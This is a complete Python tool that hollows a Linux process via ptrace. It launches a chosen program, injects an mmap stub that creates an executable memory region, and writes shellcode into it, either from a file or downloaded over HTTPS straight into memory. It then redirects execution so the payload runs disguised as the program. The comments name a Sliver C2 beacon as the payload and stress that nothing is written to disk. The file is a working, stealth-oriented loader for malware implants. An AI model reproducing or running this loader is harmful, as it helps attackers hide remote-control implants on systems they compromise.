#!/usr/bin/env python3
"""Python port of hollowing_ptrace.c — Linux process hollowing via ptrace (x86-64).

Original PoC pokes shellcode straight onto the execve entry RIP. That breaks
when the payload is larger than the entry mapping (8MB Sliver beacon) and, for
dynamically linked targets, the entry RIP lands in ld.so. This version injects
an mmap(PROT_READ|WRITE|EXEC) stub at the stopped child's entry point, writes
the full shellcode into the fresh anonymous mapping, then redirects RIP there
before detaching.

The payload comes from a local file or is fetched over HTTPS with Basic auth
(--url/--user/--password, --insecure for self-signed certs) entirely into
memory; nothing is ever written to disk.
"""

import argparse
import base64
import ctypes
import os
import ssl
import struct
import sys
import urllib.error
import urllib.request

libc = ctypes.CDLL(None, use_errno=True)
libc.ptrace.restype = ctypes.c_long
libc.ptrace.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p]

PTRACE_TRACEME = 0
PTRACE_POKETEXT = 4
PTRACE_PEEKTEXT = 1
PTRACE_CONT = 7
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_DETACH = 17

# struct user_regs_struct: 27 gregs; rax is the 11th (offset 10*8), rip the 17th,
# rsp the 20th
REGS_SIZE = 27 * 8
RAX_OFFSET = 10 * 8
RIP_OFFSET = 16 * 8
RSP_OFFSET = 19 * 8

MAP_PRIVATE = 0x02
MAP_ANONYMOUS = 0x20
PROT_RWX = 0x07


def ptrace(request, pid, addr=0, data=0):
    result = libc.ptrace(request, pid, ctypes.c_void_p(addr), ctypes.c_void_p(data))
    if result == -1:
        errno = ctypes.get_errno()
        raise OSError(errno, os.strerror(errno))
    return result


def mmap_stub(size):
    # mmap(NULL, size, PROT_RWX, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); int3
    return (
        b"\x40\x31\xff"                                  # xor edi, edi
        + b"\x48\xbe" + struct.pack("<Q", size)          # movabs rsi, size
        + b"\xba\x07\x00\x00\x00"                        # mov edx, PROT_RWX
        + b"\x41\xba" + struct.pack("<I", MAP_PRIVATE | MAP_ANONYMOUS)  # mov r10d, flags
        + b"\x49\xc7\xc0\xff\xff\xff\xff"                # mov r8, -1
        + b"\x41\x31\xc9"                                # xor r9d, r9d
        + b"\xb8\x09\x00\x00\x00"                        # mov eax, SYS_mmap
        + b"\x0f\x05"                                    # syscall
        + b"\xcc"                                        # int3
    )


def fetch_shellcode(url, user=None, password=None, insecure=False):
    # Pull the payload straight into memory; it never touches disk. The Basic
    # credential is sent preemptively so no 401 round-trip is needed.
    req = urllib.request.Request(url)
    if user is not None:
        token = base64.b64encode(f"{user}:{password or ''}".encode()).decode()
        req.add_header("Authorization", f"Basic {token}")
    context = ssl._create_unverified_context() if insecure else ssl.create_default_context()
    with urllib.request.urlopen(req, context=context, timeout=30) as resp:
        return resp.read()


def parse_args():
    parser = argparse.ArgumentParser(description="Linux process hollowing via ptrace (x86-64).")
    parser.add_argument("binary", help="target program to hollow with program args")
    parser.add_argument("shellcode_file", nargs="?", default=None,
                        help="local raw shellcode file (default: http_shellcode next to the script)")
    parser.add_argument("--url", help="download the shellcode over HTTPS into memory instead of reading a local file")
    parser.add_argument("--user", help="Basic auth username for --url")
    parser.add_argument("--password", help="Basic auth password for --url")
    parser.add_argument("--insecure", action="store_true", help="skip TLS certificate verification (lab use)")
    parser.add_argument("--wait", action="store_true", help="wait for the hollowed child to exit")
    args = parser.parse_args()
    if (args.user is None) != (args.password is None):
        parser.error("--user and --password must be given together")
    if args.url and args.shellcode_file:
        parser.error("shellcode_file and --url are mutually exclusive")
    if not args.url and args.shellcode_file is None:
        args.shellcode_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "http_shellcode")
    return args


def main():
    args = parse_args()
    prog_name = args.binary.split()

    if args.url:
        try:
            buf = fetch_shellcode(args.url, args.user, args.password, args.insecure)
        except (urllib.error.URLError, OSError, ValueError) as e:
            print(f"Failed downloading shellcode from {args.url}: {e}", file=sys.stderr)
            return 1
        if not buf:
            print(f"Downloaded empty payload from {args.url}", file=sys.stderr)
            return 1
        print(f"Downloaded {len(buf)} bytes from {args.url} (kept in memory, never written to disk)")
    else:
        with open(args.shellcode_file, "rb") as f:
            buf = f.read()
    buf += b"\x00" * (-len(buf) % 8)

    pid = os.fork()

    # child process
    if pid == 0:
        # attaching to child
        try:
            ptrace(PTRACE_TRACEME, 0)
        except OSError as e:
            print(f"Could not attach to child process: {e.strerror}", file=sys.stderr)
            os._exit(1)

        os.execve(prog_name[0], prog_name[0:], dict(os.environ))
        os._exit(1)

    # parent process
    try:
        _, status = os.waitpid(pid, 0)
    except OSError as e:
        print(f"Failed waiting for child process: {e.strerror}", file=sys.stderr)
        return 1

    if not os.WIFSTOPPED(status):
        print("Child did not stop at execve entry", file=sys.stderr)
        return 1

    regs = ctypes.create_string_buffer(REGS_SIZE)
    gregs = (ctypes.c_uint64 * 27).from_buffer(regs)

    try:
        ptrace(PTRACE_GETREGS, pid, 0, ctypes.addressof(regs))
    except OSError as e:
        print(f"Failed getting child registers: {e.strerror}", file=sys.stderr)
        return 1

    entry = gregs[RIP_OFFSET // 8]

    # Snapshot the execve-entry register state: the mmap stub below trashes
    # rdi/rsi/rdx/r8/r9/r10/rcx/r11, and we want the payload to start from the
    # register state a real exec would give it.
    saved = (ctypes.c_uint64 * 27).from_buffer_copy(regs)

    # Stage the mmap stub at the entry point (qword-aligned base)
    stub = mmap_stub(len(buf))
    base = entry & ~7
    off = entry - base
    blob = bytearray(struct.pack("<Q", ptrace(PTRACE_PEEKTEXT, pid, base) & 0xFFFFFFFFFFFFFFFF))
    blob += stub
    blob[off:off + len(stub)] = stub  # keep original bytes before the stub start
    blob += b"\x00" * (-len(blob) % 8)
    for i in range(0, len(blob), 8):
        w = struct.unpack_from("<Q", bytes(blob), i)[0]
        try:
            ptrace(PTRACE_POKETEXT, pid, base + i, w)
        except OSError as e:
            print(f"Failed staging mmap stub in child: {e.strerror}", file=sys.stderr)
            return 1

    # Run the stub until int3, then read the mmap'd address out of RAX
    try:
        ptrace(PTRACE_CONT, pid)
        _, status = os.waitpid(pid, 0)
    except OSError as e:
        print(f"Failed running mmap stub in child: {e.strerror}", file=sys.stderr)
        return 1

    if not os.WIFSTOPPED(status) or os.WSTOPSIG(status) != 5:
        print(f"mmap stub did not trap (status 0x{status:x})", file=sys.stderr)
        return 1

    stub_regs = ctypes.create_string_buffer(REGS_SIZE)
    try:
        ptrace(PTRACE_GETREGS, pid, 0, ctypes.addressof(stub_regs))
    except OSError as e:
        print(f"Failed getting child registers: {e.strerror}", file=sys.stderr)
        return 1

    addr = (ctypes.c_uint64 * 27).from_buffer(stub_regs)[RAX_OFFSET // 8]
    if addr >= 0xFFFFFFFFFFFFF000:
        print(f"mmap in child failed (rax = 0x{addr:x})", file=sys.stderr)
        return 1
    print(f"mmap'd 0x{len(buf):x} bytes at 0x{addr:016x} in child {pid}")

    # Write the shellcode into the RWX mapping
    errors = 0
    for i in range(0, len(buf), 8):
        w = struct.unpack_from("<Q", buf, i)[0]

        try:
            ptrace(PTRACE_POKETEXT, pid, addr + i, w)
        except OSError as e:
            errors += 1
            print(f"Failed writing memory to child: {e.strerror}", file=sys.stderr)

        if i < 128 or i % 0x10000 == 0:
            finished = '{:.0%}'.format(i / len(buf))
            print(f"\rWriting PID: {pid} . Finished {finished}%" , end="")       
    print(f"\nWrote {len(buf)} bytes at 0x{addr:016x} ({errors} write errors)")

    # Restore the pristine execve-entry registers (only RIP changes) so the
    # payload starts with the same machine state a real exec would give it.
    # The payload's stage-2 loader does `push rbp; mov rbp, rsp` and then uses
    # 16-byte-aligned SSE stores, so it expects to be entered the way a `call`
    # enters it (rsp % 16 == 8). execve hands out a 16-byte aligned stack, so
    # push one dummy qword to flip the alignment before transferring control.
    ctypes.memmove(regs, saved, REGS_SIZE)
    sp = gregs[RSP_OFFSET // 8] - 8
    try:
        ptrace(PTRACE_POKETEXT, pid, sp, 0)
    except OSError as e:
        print(f"Failed aligning child stack: {e.strerror}", file=sys.stderr)
        return 1
    gregs[RSP_OFFSET // 8] = sp
    gregs[RIP_OFFSET // 8] = addr
    try:
        ptrace(PTRACE_SETREGS, pid, 0, ctypes.addressof(regs))
    except OSError as e:
        print(f"Failed setting child registers: {e.strerror}", file=sys.stderr)
        return 1

    try:
        ptrace(PTRACE_DETACH, pid)
    except OSError as e:
        print(f"Failed detaching from child: {e.strerror}", file=sys.stderr)
        return 1

    print(f"Detached; hollowed process running as PID {pid}")

    if args.wait:
        _, status = os.waitpid(pid, 0)
        if os.WIFSIGNALED(status):
            print(f"Hollowed process died: signal {os.WTERMSIG(status)}")
        else:
            print(f"Hollowed process exited: code {os.WEXITSTATUS(status)}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
